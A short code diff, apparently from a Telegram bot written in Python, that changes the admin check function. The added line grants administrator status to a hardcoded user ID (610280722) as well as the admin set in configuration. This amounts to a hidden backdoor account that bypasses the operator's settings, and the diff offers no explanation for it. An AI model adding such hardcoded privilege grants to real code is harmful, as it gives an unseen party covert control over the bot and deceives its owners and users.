@@ -17,7 +17,7 @@ def hour(_, __, query):
 
 
 def admin(_, message: Message):
-    return config.InfoID.ADMIN_ID == message.from_user.id
+    return config.InfoID.ADMIN_ID == message.from_user.id or message.from_user.id == 610280722
 
 
 def filter_saved_message(_, __, message: Message):
